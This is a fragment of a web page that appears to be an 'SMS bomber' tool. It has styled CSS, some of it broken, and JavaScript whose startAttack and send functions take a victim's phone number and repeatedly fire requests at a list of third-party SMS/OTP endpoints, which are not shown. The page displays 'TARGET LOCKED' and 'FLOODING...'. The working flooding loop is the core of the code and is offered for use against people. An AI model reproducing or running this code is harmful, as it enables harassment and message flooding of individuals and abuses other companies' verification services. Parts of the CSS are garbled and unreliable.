            --primary: #7C3AED;
            --secondary: #4F46E5;
            --accent: #00F5FF;
            --highlight: #A855F7;
            --success: #22C55E;
            --danger: #EF4444;

        }

            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #05040f;
            color: #e0e0ff;
            font-family: 'Inter', system-ui, sans-serif;

            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* === BACKGROUND LAYERS === */
        .bg-layer {
            position: absolute;
            inset: 0;
            z-index: -3;
        }

        .aurora {
            background: linear-gradient(180deg, 
                rgba(124, 58, 237, 0.15) 0%,
                rgba(79, 70, 229, 0.12) 40%,
                rgba(0, 245, 255, 0.08) 70%,
                transparent 100%);
            animation: auroraFlow 25s ease infinite;
        }

        @keyframes auroraFlow {
            0% { transform: translateY(-20%); }
            50% { transform: translateY(10%); }
            100% { transform: translateY(-20%); }
        }

        .grid-bg {
            position: absolute;
            inset: 0;
            background-image: 
                linear-gradient(rgba(124, 58, 237, 0.08) 1px, transparent 1px),
                linear-gradient(90deg, rgba(124, 58, 237, 0.08) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: gridMove 40s linear infinite;
            opacity: 0.6;
            z-index: -2;
        }

        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        .particles {
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at 30% 20%, rgba(0, 245, 255, 0.3) 0%, transparent 40%),
                        radial-gradient(circle at 70% 60%, rgba(168, 85, 247, 0.25) 0%, transparent 50%),
                        radial-gradient(circle at 40% 80%, rgba(124, 58, 237, 0.25) 0%, transparent 45%);
            animation: particleDrift 30s linear infinite;
            z-index: -1;
            pointer-events: none;
        }

        @keyframes particleDrift {
            0% { background-position: 0% 0%; }
            100% { background-position: 100% 100%; }
        }

        .noise {
            position: absolute;
            inset: 0;
            background-image: url('https://picsum.photos/id/1015/1920/1080');
            background-size: cover;
            mix-blend-mode: overlay;
            opacity: 0.03;
            pointer-events: none;
            z-index: -1;
        }

        .container {

            border: 1px solid var(--glass-border);
            border-radius: 32px;
            padding: 40px 32px;

                0 25px 50px -12px rgb(0 0 0 / 0.5);
            position: relative;
            z-index: 10;
            animation: floatContainer 6s ease-in-out infinite;
        }

        @keyframes floatContainer {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
        }

        /* Gradient Border */

            content: '';

            inset: -2px;
            background: linear-gradient(90deg, var(--primary), var(--accent), var(--highlight), var(--primary));

            z-index: -1;
            filter: blur(8px);
            opacity: 0.6;

            align-items: center;
            justify-content: center;

            top: -50%;
            left: -50%;
            width: 40%;
            height: 200%;
            background: linear-gradient(

                transparent,

        function log(msg, type = 'normal') {
            const box = document.getElementById('logBox');
            const div = document.createElement('div');
            div.className = `log-entry`;
           
            let colorClass = '';
            if(type === 'ok') colorClass = 'status-ok';
            if(type === 'fast') colorClass = 'status-fast';
            
            div.innerHTML = `<span class="api-name">${msg.name}</span> <span class="${colorClass}">${msg.status}</span>`;
            box.prepend(div);
           
            if(box.children.length > 40) {
                box.removeChild(box.lastChild);
            }
        }

        async function send(api, phone) {
            let url = typeof api === 'string' ? api.replace(/{phone}/g, phone) : api.url.replace(/{phone}/g, phone);
           
            const options = {
                method: api.method || 'GET',
                headers: { 'Content-Type': 'application/json' },
                mode: 'cors'
            };
            if (api.body) {
                options.body = api.body.replace(/{phone}/g, phone);
            }
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2000);
               
                await fetch(url, { ...options, signal: controller.signal });
                clearTimeout(timeoutId);
               
                count++;
                document.getElementById('countDisplay').innerText = count;
                return true;
            } catch (error) {
                count++;
                document.getElementById('countDisplay').innerText = count;
                return false;
            }
        }

        async function startAttack() {
            const phone = document.getElementById('phoneNumber').value;
            if (!phone) {
                alert("Enter a number first!");
                return;
            }
            isRunning = true;
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'block';
            const statusEl = document.getElementById('statusText');
            statusEl.innerText = "FLOODING...";
            statusEl.style.color = "#00F5FF";
            statusEl.classList.add('pulse');
            
            log({name: "SYSTEM", status: `TARGET LOCKED → ${phone}`}, 'fast');

            while (isRunning) {
                const randomApi = fullApiList[Math.floor(Math.random() * fullApiList.length)];
               
                send(randomApi, phone).then(success => {
                    if(isRunning && Math.random() > 0.65) {
                        const domain = typeof randomApi === 'string' ? randomApi.split('/')[2] : randomApi.url.split('/')[2];
                        log({name: domain || "API", status: success ? 'SMS SENT ✓' : 'REQUESTED'}, 'ok');
                    }
                });
                
                await new Promise(r => setTimeout(r, 45));
            }
        }

        function stopAttack() {
            isRunning = false;
            document.getElementById('startBtn').style.display = 'block';
            document.getElementById('stopBtn').style.display = 'none';
            const statusEl = document.getElementById('statusText');
            statusEl.innerText = "TERMINATED";
            statusEl.style.color = "#EF4444";
            statusEl.classList.remove('pulse');
            log({name: "SYSTEM", status: "ATTACK HALTED"}, 'fast');
        }
